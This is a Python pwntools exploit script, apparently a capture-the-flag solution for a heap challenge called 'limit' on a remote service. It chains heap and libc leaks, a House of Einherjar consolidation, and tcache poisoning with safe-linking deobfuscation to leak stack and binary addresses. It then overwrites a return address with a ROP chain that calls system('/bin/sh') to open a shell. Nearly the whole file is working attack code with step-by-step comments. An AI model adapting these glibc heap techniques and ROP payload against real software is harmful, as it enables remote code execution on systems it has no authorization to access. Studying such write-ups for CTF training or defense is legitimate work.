#!/usr/bin/env python3

from pwn import *

exe = ELF("./limit_patched")
libc = ELF("./libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("smiley.cat", 36123)

    return r


def alloc(index: int, size: int):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Size: ", str(size).encode())


def free(index: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Index: ", str(index).encode())


def puts(index: int) -> bytes:
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.recvuntil(b"Data: ")
    return r.recvline().strip()


def read(index: int, data: bytes) -> bytes:
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"Index: ", str(index).encode())
    r.sendlineafter(b"Data: ", data)


def obfuscate(addr: int, pos: int):
    return addr ^ (pos >> 12)


# NOTE: Notes on some vulnerabilities are in the program's source code
#       We are going to leverage House of Einherjar to have some leaks
def main():
    r = conn()



    ####################  HEAP LEAK  ####################

    # Fill the tcache (7 chunks) and put a chunk in the fastbin
    for idx in range(8):
        alloc(idx, 0xf8)
    
    # Free them backwards just to avoid some headache with the indexes
    for idx in range(7, -1, -1):
        free(idx)
    
    # Reallocate the chunks to get the fastbin chunk's ptr->next value (we avoid ptr mangling with this)
    for idx in range(8):
        alloc(idx, 0xf8)
    
    heap = int.from_bytes(puts(7), "little") << 12
    log.info(f"heap @ 0x{heap:x}")



    ####################  LIBC LEAK  ####################

    # Allocate 8 more chunks to then free them to the fastbin
    for idx in range(8, 16):
        alloc(idx, 0xf8)
    
    # Free the last 7 chunks to put them in the tcache (this will help to avoid fastbin consolidation with top_chunk)
    for idx in range(7):
        free(idx + 9)

    # Now free the first 9 chunks to put them in the fastbin.
    # This will trigger the consolidation and put the chunk in the unsorted bin
    for idx in range(9):
        free(idx)

    # Reallocate the last 7 chunks from the tcache
    for idx in range(9, 16):
        alloc(idx, 0xf8)

    # Now this chunk will be allocated by taking some space from the unsorted bin chunk (consolidated).
    # Thus it will have the unsorted bin fd and bk pointers!
    alloc(0, 0xf8)

    libc.address = int.from_bytes(puts(0), "little") - (libc.sym["main_arena"] + 1424)
    log.info(f"libc @ 0x{libc.address:x}")



    ####################  House of Einherjar  ####################

    # Realloc everything to setup the next stage
    for idx in range(1, 9):
        alloc(idx, 0xf8)

    # Fill the tcache again, this time we will put the first 7 chunks in the tcache
    for idx in range(7):
        free(idx)

    # Since tcache was filled again, this will trigger consolidation and merge with the top_chunk, cleaning evertything
    for idx in range(7, 16):
        free(idx)

    # Alloc from tcache to free in the fastbin and trigger its consolidation mechanism
    for idx in range(7):
        alloc(idx, 0xf8)

    alloc(7, 0xf8)      # This will be the chunk that can be read to and change stuff
    alloc(8, 0xf8)      # This will be the chunk that will be consolidated with the previous one
    alloc(9, 0xf8)      # This avoid consolidation with the top_chunk

    # Fill the tcache again
    for idx in range(7):
        free(idx)

    payload = flat(
        heap + 0x990,
        heap + 0x990,
        heap + 0x990,
        heap + 0x990,
        b"A" * 0xd0,
        0x100
    )

    # This will clean the prev_inuse bit and trigger the consolidation to the previous chunk
    read(7, payload)

    # Consolidation triggered
    free(8)



    ####################  STACK LEAK  ####################

    # Allocate a smaller chunk, this will overlap with the 7th chunk
    alloc(8, 0x28)
    alloc(9, 0x28)      # This will help us to increase the relative bin size

    # The first will serve, as said, just to increase the bin size (it will be lost)
    # The second chunk will be used so that we can overwrite its fd pointer
    free(9)
    free(8)

    # This will overwrite the freed chunk's next pointer with a pointer to stack
    read(7, p64(obfuscate(libc.sym["__libc_argv"], heap)))

    alloc(8, 0x28)      # This will move the tcachebin head to the pointer to stack
    alloc(9, 0x28)      # This will move the tcachebin head to the stack address (it will be lost)
    free(8)             # This will place the chunk in the tcachebin and set his next ptr to stack address
                        # By doing so, we can read from overlapping chunk and get the address

    # Leaked stack address (we need to go through a few deobfuscation steps first)
    leak = int.from_bytes(puts(7), "little")
    stack_addr = obfuscate(obfuscate(leak, heap), libc.sym["__libc_argv"])
    log.info(f"stack addr @ 0x{stack_addr:x}")



    ####################  BINARY LEAK  ####################

    # This will reset the overlapping chunk for the next leak.
    # It will also be useful to increase tcachebin count
    alloc(8, 0x28)
    alloc(9, 0x28)
    free(9)
    free(8)

    read(7, p64(obfuscate(stack_addr - 0x48, heap)))

    alloc(8, 0x28)      # This will move the tcachebin head to the pointer to binary address
    alloc(9, 0x28)      # This will move the tcachebin head to the binary address (it will be lost)
    free(8)             # This will place the chunk in the tcachebin and set his next ptr to binary address
                        # By doing so, we can read from overlapping chunk and get the address

    # Leaked binary address (we need to go through a few deobfuscation steps first)
    leak = int.from_bytes(puts(7), "little")
    exe.address = obfuscate(obfuscate(leak, heap), stack_addr - 0x48) - 0x1160
    log.info(f"binary @ 0x{exe.address:x}")



    ####################  ROP  ####################

    alloc(8, 0x28)
    alloc(9, 0x28)
    free(9)
    free(8)

    read(7, p64(obfuscate(exe.sym["chunks"], heap)))

    alloc(8, 0x28)      # This will move the tcachebin head to the pointer to chunks array
    alloc(9, 0x28)      # This will move the tcachebin head to the chunks array
    
    # This will place an entry in the chunk array and size array, we will then overwrite it with
    # __isoc99_scanf's return address (read() calls a serie of functions) and overwrite it with a ROP chain
    alloc(0, 0xe8)
    read(9, p64(stack_addr - 0x170))


    pop_rdi = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    payload = flat(
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        pop_rdi + 1,    # Dummy return
        libc.sym["system"]
    )

    # Overwrite the __isoc99_scanf's return address with a ROP chain
    read(0, payload)

    # Enjoy the shell
    r.interactive("$ ")


if __name__ == "__main__":
    main()
